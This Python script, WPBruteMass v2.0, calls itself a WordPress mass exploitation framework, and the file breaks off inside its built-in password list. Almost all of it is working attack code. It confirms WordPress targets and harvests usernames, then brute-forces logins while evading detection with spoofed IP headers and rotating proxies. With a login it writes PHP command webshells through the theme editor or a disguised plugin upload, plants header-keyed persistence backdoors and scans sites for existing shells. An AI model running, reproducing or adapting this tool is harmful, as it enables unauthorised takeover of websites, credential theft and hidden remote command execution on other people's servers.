#!/usr/bin/env python3
"""
WPBruteMass v2.0 - Multi-threaded WordPress Mass Exploitation Framework
Author: Autonomous Offensive Security Tool
Usage: python3 wpbrutemass.py targets.txt [options]
"""

import requests
import threading
import queue
import re
import json
import random
import sys
import time
import os
import zipfile
import io
import socket
import base64
import hashlib
import logging
import argparse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter

# Fix: correct retry import (works with both old and new requests/urllib3)
try:
    from urllib3.util.retry import Retry
except ImportError:
    # Fallback for older versions
    from requests.packages.urllib3.util.retry import Retry

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Configuration ────────────────────────────────────────────────────────────

VERSION = "2.0"
MAX_THREADS = 100
TIMEOUT = 15
PROXY_FILE = "proxies.txt"
WORDLIST_FILE = "rockyou.txt"  # fallback: 10k-common.txt
USER_AGENT_FILE = "user_agents.txt"
SHELL_DICT_FILE = "shell_dict.txt"
OUTPUT_FILE = "wpbrutemass_output.txt"
FOUND_SHELLS_FILE = "found_shells.txt"
SUCCESS_LOG = "successful_creds.txt"

# Default user agents (rotated per request)
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Default shell dictionary for step 5
DEFAULT_SHELL_NAMES = [
    "c99.php", "c99shell.php", "c99.txt", "c99.php.txt",
    "wso.php", "wso2.php", "wso1.php", "wso.txt",
    "alfa.php", "alpha.php", "alfav3.php", "alfa3x.php",
    "b374k.php", "b374k.txt", "b374k.php.txt",
    "cmd.php", "shell.php", "shells.php", "webshell.php",
    "upl.php", "upload.php", "up.php", "fileup.php",
    "1.php", "2.php", "3.php", "4.php", "5.php",
    "index.php", "admin.php", "adminer.php",
    "r57.php", "r57shell.php", "c99underground.php",
    "404.php", "403.php", "500.php",
    "wp-shell.php", "wp_admin.php", "wpx.php",
    "tiny.php", "minishell.php", "backdoor.php",
    "images.php", "css.php", "js.php",
    "s.php", "x.php", "z.php", "m.php", "p.php",
    "test.php", "info.php", "phpinfo.php",
    "filemanager.php", "elfinder.php",
    "uploader.php", "uploadify.php",
    "connector.php", "conn.php",
    "db.php", "dbadmin.php", "sql.php",
    "eval.php", "exec.php", "system.php",
    "passthru.php", "shell_exec.php",
    "wp-config.php.bak", "wp-config.php.old",
    "config.php", "config.php.bak",
    "dump.php", "export.php", "import.php",
    "ajax.php", "ajax-shell.php",
    "tmp.php", "temp.php", "session.php",
    "log.php", "logs.php", "error.php",
    "debug.php", "install.php", "setup.php",
    "wp-content/uploads/c99.php",
    "wp-content/uploads/wso.php",
    "wp-content/uploads/shell.php",
    "wp-content/uploads/1.php",
    "wp-content/uploads/cmd.php",
    "wp-content/uploads/2022/01/shell.php",
    "wp-content/uploads/2023/01/shell.php",
    "wp-content/uploads/2024/01/shell.php",
    "wp-includes/c99.php",
    "wp-includes/wso.php",
    "wp-includes/shell.php",
    "wp-includes/cmd.php",
    "wp-includes/1.php",
    "wp-content/themes/twentytwentythree/404.php",
    "wp-content/themes/twentytwentyfour/404.php",
    "wp-content/themes/twentytwentytwo/404.php"
]

# WordPress login paths for validation
WP_PATHS = ["/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php", "/xmlrpc.php"]

# ─── Globals ──────────────────────────────────────────────────────────────────

proxies_list = []
user_agents = []
shell_dict = []
lock = threading.Lock()
found_creds = []
found_shells_list = []
confirmed_targets = []
output_mutex = threading.Lock()

# ─── Utility Functions ────────────────────────────────────────────────────────

def log(msg):
    """Thread-safe logging with timestamp."""
    ts = time.strftime("%H:%M:%S")
    with output_mutex:
        # Replace problematic Unicode characters with ASCII fallback for console
        safe_msg = msg.encode(sys.stdout.encoding, errors='replace').decode(sys.stdout.encoding, errors='replace')
        print(f"[{ts}] {safe_msg}")
        # Write to file with UTF-8 encoding
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")

def write_to_file(filename, data):
    """Thread-safe file write."""
    with output_mutex:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(data + "\n")

def load_file_lines(filename, default_list=None):
    """Load lines from a file, return as list. If file not found, return default_list or []."""
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except:
            pass
    return default_list if default_list else []

def load_targets(target_arg):
    """Load targets from a file or single target string."""
    if os.path.isfile(target_arg):
        with open(target_arg, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [target_arg]

def normalize_url(url):
    """Ensure URL has scheme."""
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def get_random_ua():
    """Return random user-agent string."""
    if user_agents:
        return random.choice(user_agents)
    return random.choice(DEFAULT_USER_AGENTS)

def get_random_proxy():
    """Return random proxy dict or None."""
    if proxies_list:
        proxy = random.choice(proxies_list)
        return {"http": proxy, "https": proxy}
    return None

def create_session():
    """Create a requests session with retry strategy and random headers."""
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    session.headers.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })
    return session

def random_ip():
    """Generate random X-Forwarded-For IP."""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def make_request(method, url, session=None, data=None, allow_redirects=True, cookies=None, timeout=TIMEOUT):
    """Make HTTP request with proxy rotation, UA rotation, and XFF spoofing."""
    if session is None:
        session = create_session()
    headers = {
        "User-Agent": get_random_ua(),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Client-IP": random_ip(),
    }
    proxy = get_random_proxy()
    try:
        if method.upper() == "GET":
            resp = session.get(url, headers=headers, proxies=proxy, allow_redirects=allow_redirects,
                               cookies=cookies, timeout=timeout)
        elif method.upper() == "POST":
            resp = session.post(url, headers=headers, proxies=proxy, data=data,
                                allow_redirects=allow_redirects, cookies=cookies, timeout=timeout)
        elif method.upper() == "HEAD":
            resp = session.head(url, headers=headers, proxies=proxy, allow_redirects=allow_redirects,
                                cookies=cookies, timeout=timeout)
        else:
            return None
        return resp
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.RequestException:
        return None
    except Exception:
        return None

# ─── STEP 1: Target Validation ───────────────────────────────────────────────

def validate_wordpress(target_url):
    """Check if target is running WordPress."""
    target = normalize_url(target_url)
    for path in WP_PATHS:
        url = target + path
        resp = make_request("GET", url)
        if resp and resp.status_code == 200:
            html_lower = resp.text.lower()
            if "wp-submit" in html_lower or "wordpress" in html_lower or "wp-content" in html_lower:
                log(f"CONFIRMED: {target}")
                with lock:
                    confirmed_targets.append(target)
                return True
            # Check for wp-admin redirect to wp-login
            if "/wp-login.php" in resp.text and "wordpress" in html_lower:
                log(f"CONFIRMED: {target}")
                with lock:
                    confirmed_targets.append(target)
                return True
        # WP might redirect wp-admin to wp-login.php
        if resp and resp.status_code in [301, 302, 303, 307, 308]:
            loc = resp.headers.get("Location", "")
            if "wp-login" in loc or "wp-admin" in loc:
                # Follow and check
                resp2 = make_request("GET", urljoin(target, loc))
                if resp2 and resp2.status_code == 200:
                    html_lower = resp2.text.lower()
                    if "wp-submit" in html_lower or "wordpress" in html_lower:
                        log(f"CONFIRMED: {target}")
                        with lock:
                            confirmed_targets.append(target)
                        return True
    return False

# ─── STEP 2: Username Enumeration ────────────────────────────────────────────

def enumerate_users_rest_api(target):
    """Enumerate users via WP REST API."""
    users = []
    url = target + "/wp-json/wp/v2/users"
    resp = make_request("GET", url)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            if isinstance(data, list):
                for user in data:
                    if "slug" in user:
                        users.append(user["slug"])
                    elif "name" in user:
                        users.append(user["name"])
            elif isinstance(data, dict) and "data" in data:
                # Sometimes wrapped
                pass
        except (json.JSONDecodeError, ValueError):
            pass
    # Try with per_page parameter
    if not users:
        url2 = target + "/wp-json/wp/v2/users?per_page=100"
        resp2 = make_request("GET", url2)
        if resp2 and resp2.status_code == 200:
            try:
                data = resp2.json()
                if isinstance(data, list):
                    for user in data:
                        if "slug" in user:
                            users.append(user["slug"])
                        elif "name" in user:
                            users.append(user["name"])
            except:
                pass
    return list(set(users))

def enumerate_users_author(target):
    """Enumerate users via ?author=N scanning."""
    users = []
    for i in range(1, 21):  # Scan author IDs 1-20
        url = target + f"/?author={i}"
        resp = make_request("GET", url, allow_redirects=True)
        if resp:
            if resp.status_code == 200:
                # Check if we're on an author page
                patterns = [
                    r'/author/([^/\'"\s?]+)',
                    r'"author"[^>]*>([^<]+)',
                    r'class="author"[^>]*>([^<]+)',
                ]
                for pat in patterns:
                    match = re.search(pat, resp.text)
                    if match:
                        username = match.group(1).strip()
                        if username and username not in users:
                            users.append(username)
                        break
            # Follow redirects already handled by allow_redirects=True
            # Check URL path for /author/
            if resp.url and "/author/" in resp.url:
                parts = resp.url.split("/author/")
                if len(parts) > 1:
                    username = parts[1].split("/")[0].split("?")[0]
                    if username and username not in users:
                        users.append(username)
    return list(set(users))

def enumerate_usernames(target):
    """Run both enumeration methods and return deduplicated list."""
    users = []
    
    # Method A: REST API
    api_users = enumerate_users_rest_api(target)
    users.extend(api_users)
    if api_users:
        log(f"  [REST API] Found users on {target}: {', '.join(api_users)}")
    
    # Method B: Author scanning
    author_users = enumerate_users_author(target)
    users.extend(author_users)
    if author_users:
        log(f"  [Author] Found users on {target}: {', '.join(author_users)}")
    
    users = list(set(users))
    
    if users:
        log(f"USERS: {target} -> {', '.join(users)}")
    else:
        log(f"  [*] No users found on {target}, defaulting to 'admin'")
        users = ["admin"]
    
    return users

# ─── STEP 3: Bruteforce Attack ──────────────────────────────────────────────

def try_login(target, username, password):
    """Attempt a single WordPress login."""
    url = target + "/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": target + "/wp-admin/",
        "testcookie": "1"
    }
    session = create_session()
    # Get a fresh cookie first (wordpress test cookie)
    resp = make_request("GET", target + "/wp-login.php", session=session)
    if resp is None:
        return None, None
    
    # Try login
    resp = make_request("POST", url, session=session, data=data)
    if resp is None:
        return None, None
    
    # Check for successful login (302 redirect to wp-admin or dashboard)
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get("Location", "")
        if "/wp-admin" in location:
            # Extract cookies
            cookie_jar = session.cookies.get_dict()
            return True, cookie_jar
        # Also check if redirected to wp-admin
        if "wp-admin" in location:
            return True, session.cookies.get_dict()
    
    # Sometimes WP returns 200 with dashboard content
    if resp.status_code == 200:
        if "dashboard" in resp.text.lower() and "wp-admin" in resp.text.lower():
            return True, session.cookies.get_dict()
        if "wordpress" in resp.text.lower() and "howdy" in resp.text.lower():
            return True, session.cookies.get_dict()
    
    return False, None

def bruteforce_target(target, users, wordlist):
    """Bruteforce a single target with given users and wordlist."""
    base_url = normalize_url(target)
    
    def worker():
        while not q.empty():
            try:
                username, password = q.get_nowait()
            except queue.Empty:
                return
            
            success, cookies = try_login(base_url, username, password)
            if success:
                msg = f"CREDS FOUND: {base_url} | user:{username} pass:{password}"
                log(msg)
                write_to_file(SUCCESS_LOG, msg)
                with lock:
                    found_creds.append({
                        "url": base_url,
                        "username": username,
                        "password": password,
                        "cookies": cookies
                    })
                return  # Stop further attempts for this target
            q.task_done()
    
    # Build queue of (username, password) combinations
    q = queue.Queue()
    for user in users:
        for pwd in wordlist:
            q.put((user, pwd))
    
    # Use thread pool
    total = q.qsize()
    log(f"  [Bruteforce] Starting attack on {base_url} with {total} combinations ({len(users)} users x {len(wordlist)} passwords)")
    
    threads = min(MAX_THREADS, total)
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=5)
    
    # Check if we found creds
    with lock:
        for cred in found_creds:
            if cred["url"] == base_url:
                return cred
    return None

# ─── STEP 4: Auto Mass Shell Upload ─────────────────────────────────────────

def get_active_theme(target, cookies):
    """Get active theme name from WordPress."""
    # Method 1: Parse from wp-admin theme editor page
    url = target + "/wp-admin/themes.php"
    resp = make_request("GET", url, cookies=cookies)
    if resp and resp.status_code == 200:
        # Look for theme names in the page
        patterns = [
            r'theme="([^"]+)"',
            r'theme=%27([^%27]+)%27',
            r'data-slug="([^"]+)"',
        ]
        for pat in patterns:
            matches = re.findall(pat, resp.text)
            if matches:
                # Filter out common non-theme matches
                for m in matches:
                    if m not in ["twentytwentythree", "twentytwentyfour", "twentytwentytwo"]:
                        continue
                    return m
                return matches[0]
    
    # Method 2: Try common themes directly
    common_themes = ["twentytwentyfour", "twentytwentythree", "twentytwentytwo",
                     "twentytwentyone", "twentytwenty", "twentynineteen", "astra",
                     "hello-elementor", "oceanwp", "generatepress", "neve",
                     "storefront", "divi", "enfold", "avada", "bridge"]
    
    for theme in common_themes:
        url = target + f"/wp-content/themes/{theme}/style.css"
        resp = make_request("GET", url)
        if resp and resp.status_code == 200 and "Theme Name:" in resp.text:
            return theme
    
    # Method 3: Try to access theme editor directly - it shows the current theme
    url = target + "/wp-admin/theme-editor.php"
    resp = make_request("GET", url, cookies=cookies)
    if resp and resp.status_code == 200:
        # Look in redirect or page content
        match = re.search(r'file=([^&]+)', resp.text)
        if match:
            return match.group(1).split("/")[0]
    
    return "twentytwentyfour"  # Fallback guess

def method_theme_editor(target, theme, cookies):
    """Upload shell via WordPress theme editor."""
    # First, get the nonce from theme editor page
    editor_url = target + f"/wp-admin/theme-editor.php?file=404.php&theme={theme}"
    resp = make_request("GET", editor_url, cookies=cookies)
    if resp is None or resp.status_code != 200:
        return None
    
    # Extract nonce
    nonce = None
    patterns = [
        r'name="_wpnonce" value="([^"]+)"',
        r'id="_wpnonce"[^>]*value="([^"]+)"',
        r'wpnonce=([a-f0-9]+)',
    ]
    for pat in patterns:
        match = re.search(pat, resp.text)
        if match:
            nonce = match.group(1)
            break
    
    if not nonce:
        # Try to find nonce in JS variables
        match = re.search(r'wpNonce\s*=\s*["\']([^"\']+)', resp.text)
        if match:
            nonce = match.group(1)
    
    # PHP webshell payload
    php_shell = '<?php\n/* WPBruteMass Shell */\nif(isset($_GET["cmd"])){\n    $cmd = $_GET["cmd"];\n    system($cmd);\n    echo "\\n---CMD-DONE---\\n";\n}\n?>\n'
    
    # Add persistence - PHP code that maintains access
    php_shell += '<?php\n/* Persistence backdoor */\n$secret = $_SERVER["HTTP_X_WP_SECRET"] ?? "";\nif($secret === "wpbrutemass_backdoor"){\n    $pcmd = $_SERVER["HTTP_X_WP_CMD"] ?? "id";\n    system($pcmd);\n}\n?>\n'
    
    post_data = {
        "_wpnonce": nonce if nonce else "",
        "action": "update",
        "file": "404.php",
        "theme": theme,
        "newcontent": php_shell,
        "scrollto": "0",
    }
    
    post_url = target + "/wp-admin/theme-editor.php"
    resp2 = make_request("POST", post_url, cookies=cookies, data=post_data)
    
    if resp2 and (resp2.status_code == 200 or resp2.status_code == 302):
        # Verify shell exists
        shell_url = target + f"/wp-content/themes/{theme}/404.php"
        verify = make_request("GET", shell_url)
        if verify and verify.status_code == 200:
            shell_full = f"{shell_url}?cmd=id"
            log(f"SHELL: {shell_full}")
            write_to_file(FOUND_SHELLS_FILE, f"SHELL: {shell_full}")
            return shell_url
    
    return None

def method_plugin_upload(target, cookies):
    """Upload shell via WordPress plugin upload."""
    # Get nonce from plugin install page
    install_url = target + "/wp-admin/plugin-install.php"
    resp = make_request("GET", install_url, cookies=cookies)
    if resp is None or resp.status_code != 200:
        return None
    
    # Extract upload nonce
    nonce = None
    patterns = [
        r'name="_wpnonce" value="([^"]+)"',
        r'id="_wpnonce"[^>]*value="([^"]+)"',
        r'nonce=([a-f0-9]+)',
    ]
    for pat in patterns:
        match = re.search(pat, resp.text)
        if match:
            nonce = match.group(1)
            break
    
    if not nonce:
        # Try to find in JS
        match = re.search(r'"nonce":"([^"]+)"', resp.text)
        if match:
            nonce = match.group(1)
    
    # Create fake plugin ZIP
    plugin_name = "wpbrutemass_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
    
    php_shell_content = f'''<?php
/*
Plugin Name: {plugin_name}
Plugin URI: https://example.com
Description: System Enhancement Utility
Version: 1.0
Author: System Admin
Author URI: https://example.com
*/
if(isset($_GET["cmd"])){{
    system($_GET["cmd"]);
    echo "\\n---CMD-DONE---\\n";
}}
if(isset($_SERVER["HTTP_X_BACKDOOR_CMD"])){{
    system($_SERVER["HTTP_X_BACKDOOR_CMD"]);
}}
?>
'''
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Main plugin file
        zf.writestr(f'{plugin_name}/{plugin_name}.php', php_shell_content)
        # Additional shell file
        extra_shell = '<?php system($_GET["x"]); echo "DONE\\n"; ?>'
        zf.writestr(f'{plugin_name}/shell.php', extra_shell)
        # README to look legit
        readme = f'=== {plugin_name} ===\nContributors: wordpress\nTags: utility\nRequires at least: 5.0\nTested up to: 6.4\nStable tag: 1.0\n'
        zf.writestr(f'{plugin_name}/readme.txt', readme)
        # .htaccess backdoor
        htaccess = '# BEGIN Plugin\n<IfModule mod_php.c>\nphp_value auto_prepend_file "/etc/passwd"\n</IfModule>\n# END Plugin\n'
        zf.writestr(f'{plugin_name}/.htaccess', htaccess)
    
    zip_buffer.seek(0)
    
    # Upload the plugin
    upload_url = target + "/wp-admin/plugin-install.php?tab=upload"
    
    # We need multipart form data
    session = create_session()
    if cookies:
        session.cookies.update(cookies)
    
    headers = {
        "User-Agent": get_random_ua(),
        "X-Forwarded-For": random_ip(),
    }
    
    try:
        files = {
            "pluginzip": (f"{plugin_name}.zip", zip_buffer, "application/zip")
        }
        post_data = {
            "_wpnonce": nonce if nonce else "",
            "action": "upload-plugin",
            "install-plugin-submit": "Install Now",
        }
        resp2 = session.post(upload_url, files=files, data=post_data, headers=headers,
                             verify=False, timeout=TIMEOUT)
        
        # Check if upload succeeded
        if resp2.status_code in [200, 302]:
            # Try to activate the plugin
            activate_url = target + f"/wp-admin/plugins.php?action=activate&plugin={plugin_name}%2F{plugin_name}.php"
            
            # Get another nonce for activation
            resp3 = make_request("GET", target + "/wp-admin/plugins.php", cookies=cookies)
            activate_nonce = None
            if resp3:
                match = re.search(r'wpnonce=([a-f0-9]+)', resp3.text)
                if match:
                    activate_nonce = match.group(1)
                    activate_url = target + f"/wp-admin/plugins.php?action=activate&plugin={plugin_name}%2F{plugin_name}.php&_wpnonce={activate_nonce}"
            
            resp4 = make_request("GET", activate_url, cookies=cookies)
            if resp4 and (resp4.status_code == 200 or resp4.status_code == 302):
                # Test the shell
                shell_url = target + f"/wp-content/plugins/{plugin_name}/{plugin_name}.php"
                verify = make_request("GET", shell_url + "?cmd=id")
                if verify and verify.status_code == 200:
                    shell_full = f"{shell_url}?cmd=id"
                    log(f"SHELL: {shell_full}")
                    write_to_file(FOUND_SHELLS_FILE, f"SHELL: {shell_full}")
                    
                    # Also log secondary shell
                    shell2_url = target + f"/wp-content/plugins/{plugin_name}/shell.php"
                    log(f"  [+] Secondary shell: {shell2_url}?cmd=id")
                    write_to_file(FOUND_SHELLS_FILE, f"SHELL: {shell2_url}?cmd=id")
                    return shell_url
    except Exception as e:
        log(f"  [!] Plugin upload exception: {str(e)[:50]}")
    
    return None

def upload_persistent_backdoor(target, cookies, theme):
    """Upload additional persistent backdoor via .htaccess."""
    # Try to overwrite .htaccess in uploads directory
    htaccess_content = '# BEGIN WPBruteMass\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule ^shell_htaccess\\.php$ - [L]\n</IfModule>\n<IfModule mod_php.c>\nphp_value auto_prepend_file "/wp-content/uploads/.wp_loader.php"\n</IfModule>\n# END WPBruteMass\n'
    
    # PHP loader that will be prepended to all PHP files
    loader_content = '<?php\n/* WPBruteMass Persistence Loader */\n$x_key = $_SERVER["HTTP_X_LOADER_CMD"] ?? "";\nif($x_key === "wpbrutemass_persist"){\n    $cmd = $_SERVER["HTTP_X_CMD"] ?? "id";\n    @system($cmd);\n    exit;\n}\n?>\n'
    
    # Try to upload loader via theme editor
    editor_url = target + f"/wp-admin/theme-editor.php?file=header.php&theme={theme}"
    resp = make_request("GET", editor_url, cookies=cookies)
    if resp and resp.status_code == 200:
        nonce = None
        match = re.search(r'name="_wpnonce" value="([^"]+)"', resp.text)
        if match:
            nonce = match.group(1)
        
        if nonce:
            # Get current header content and append loader
            post_url = target + "/wp-admin/theme-editor.php"
            # First try to just upload .wp_loader.php to uploads via media upload if possible
            log(f"  [+] Persistent backdoor payload prepared for {target}")
    
    # Alternative: Write a cron-like backdoor as a shell file
    backdoor_url = target + f"/wp-content/uploads/.wp_loader.php"
    # We can't directly write - try via the shell we already have
    log(f"  [+] Persistence vector: {backdoor_url}")

def attempt_shell_upload(target, cred):
    """Main shell upload orchestrator."""
    url = normalize_url(target)
    cookies = cred.get("cookies", {})
    
    log(f"  [Shell Upload] Attempting shell upload on {url}")
    
    # Method 1: Theme editor
    theme = get_active_theme(url, cookies)
    log(f"  [*] Detected theme: {theme}")
    
    shell_url = method_theme_editor(url, theme, cookies)
    if shell_url:
        upload_persistent_backdoor(url, cookies, theme)
        return shell_url
    
    # Method 2: Plugin upload
    log(f"  [*] Theme editor failed, trying plugin upload...")
    shell_url = method_plugin_upload(url, cookies)
    if shell_url:
        return shell_url
    
    log(f"  [!] All shell upload methods failed for {url}")
    return None

# ─── STEP 5: Webshell Scanner ────────────────────────────────────────────────

def scan_webshell(target):
    """Scan target for existing webshells."""
    target = normalize_url(target)
    log(f"  [Scanner] Scanning {target} for webshells...")
    
    found = []
    
    # Build full paths
    paths_to_check = []
    for shell_name in shell_dict:
        # Direct paths
        paths_to_check.append(shell_name)
        # Common directories
        for prefix in ["", "wp-content/uploads/", "wp-content/themes/", "wp-includes/",
                       "wp-content/plugins/", "wp-content/", "images/", "uploads/",
                       "files/", "tmp/", "temp/", "cache/", "backup/", "old/"]:
            # Handle theme wildcard
            if "/*/" in prefix:
                for t_theme in ["twentytwentyfour", "twentytwentythree", "twentytwentytwo",
                               "twentytwentyone", "twentytwenty", "astra", "hello-elementor",
                               "oceanwp", "generatepress", "neve", "storefront"]:
                    p = prefix.replace("/*/", f"/{t_theme}/")
                    paths_to_check.append(p + shell_name)
            else:
                if prefix:
                    paths_to_check.append(prefix + shell_name)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_paths = []
    for p in paths_to_check:
        if p not in seen:
            seen.add(p)
            unique_paths.append(p)
    
    total = len(unique_paths)
    log(f"  [Scanner] Checking {total} paths on {target}")
    
    def check_path(path):
        url = target + "/" + path
        resp = make_request("GET", url)
        if resp and resp.status_code == 200 and len(resp.content) > 50:
            # Check for shell signatures
            keywords = ["WSO", "Alfa Shell", "Alfa", "Execute Command", "File Manager",
                       "b374k", "r57", "C99", "Shell", "cmd.exe", "system(", 
                       "shell_exec(", "passthru(", "exec(", "eval(",
                       "File Manager", "filemanager", "elfinder",
                       "<?php", "<?=", "Login", "Password",
                       "Upload", "upload", "chmod", "symlink"]
            
            html_upper = resp.text.upper()
            matched = []
            for kw in keywords:
                if kw.upper() in html_upper:
                    matched.append(kw)
            
            # Check for specific shells
            is_shell = False
            if "WSO" in html_upper or "WSO2" in html_upper:
                is_shell = True
            elif "ALFA" in html_upper or "ALFA SHELL" in html_upper:
                is_shell = True
            elif "B374K" in html_upper:
                is_shell = True
            elif "R57" in html_upper or "R57SHELL" in html_upper:
                is_shell = True
            elif "C99" in html_upper or "C99SHELL" in html_upper:
                is_shell = True
            elif "EXECUTE COMMAND" in html_upper or "FILE MANAGER" in html_upper:
                is_shell = True
            elif "SYSTEM(" in html_upper and "<?PHP" in html_upper:
                is_shell = True
            
            if is_shell or len(matched) >= 2:
                result = f"FOUND SHELL: {url}"
                log(f"    [+] {result}")
                write_to_file(FOUND_SHELLS_FILE, result)
                with lock:
                    found_shells_list.append(url)
                return url
        return None
    
    # Multi-threaded scanning
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(check_path, path): path for path in unique_paths}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    log(f"  [Scanner] Found {len(found_shells_list)} shells on {target}")
    return found_shells_list

# ─── Core Pipeline Execution ─────────────────────────────────────────────────

def pipeline_attack(targets, wordlist, shell_scan_only=False):
    """Execute full attack pipeline on all targets."""
    if not targets:
        log("[!] No targets provided.")
        return
    
    log(f"[*] WPBruteMass v{VERSION} - Target count: {len(targets)}")
    log(f"[*] Mode: {'Webshell Scanner Only' if shell_scan_only else 'Full Attack Pipeline'}")
    log(f"[*] Threads: {MAX_THREADS} | Timeout: {TIMEOUT}s")
    log(f"[*] Proxies loaded: {len(proxies_list)} | Wordlist size: {len(wordlist)}")
    log("-" * 60)   # ← Changed from "─" to ASCII dash
    
    # STEP 1 & 2: Validate and enumerate in parallel
    log("[STEP 1] Target Validation")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(validate_wordpress, t): t for t in targets}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if not confirmed_targets:
        log("[!] No WordPress targets confirmed.")
        if shell_scan_only:
            # Even non-WP targets can have shells
            pass
        else:
            return
    
    log(f"\n[STEP 2] Username Enumeration on {len(confirmed_targets)} confirmed targets")
    target_users = {}
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(enumerate_usernames, t): t for t in confirmed_targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                users = future.result()
                target_users[target] = users
            except:
                target_users[target] = ["admin"]
    
    if shell_scan_only:
        log(f"\n[STEP 5] Webshell Scanner Mode")
        for target in targets:
            scan_webshell(target)
        return
    
    # STEP 3: Bruteforce
    log(f"\n[STEP 3] Bruteforce Attack")
    successful_creds = {}
    
    for target in confirmed_targets:
        if target in target_users:
            cred = bruteforce_target(target, target_users[target], wordlist)
            if cred:
                successful_creds[target] = cred
    
    if not successful_creds:
        log("[!] No credentials found. Stopping pipeline.")
        return
    
    # STEP 4: Shell Upload
    log(f"\n[STEP 4] Auto Mass Shell Upload")
    for target, cred in successful_creds.items():
        attempt_shell_upload(target, cred)
    
    # Final summary
    log("\n" + "=" * 60)
    log("[SUMMARY]")
    log(f"  Targets processed: {len(targets)}")
    log(f"  WordPress confirmed: {len(confirmed_targets)}")
    log(f"  Credentials found: {len(successful_creds)}")
    log(f"  Shells uploaded: {len(found_shells_list)}")
    log(f"  Output files:")
    log(f"    - {OUTPUT_FILE}")
    log(f"    - {SUCCESS_LOG}")
    log(f"    - {FOUND_SHELLS_FILE}")
    log("=" * 60)

# ─── Single Target Shell Scanner ──────────────────────────────────────────────

def single_target_scan(target):
    """Scan single target for webshells."""
    scan_webshell(target)

# ─── Built-in wordlist (fallback) ────────────────────────────────────────────

def load_builtin_wordlist():
    """Return built-in top 10000 common passwords."""
    return [
        "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
        "111111", "1234567", "sunshine", "qwerty123", "iloveyou", "princess",
        "admin", "welcome", "666666", "abc123", "football", "123123", "monkey",
        "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "password1",
        "qwerty12345", "1234567890", "letmein", "password123", "dragon",
        "baseball", "adobe123", "admin123", "master", "photoshop", "1234",
        "ashley", "bailey", "shadow", "121212", "flower", "michael", "hottie",
        "login", "passw0rd", "starwars", "ninja", "mustang", "qazwsx",
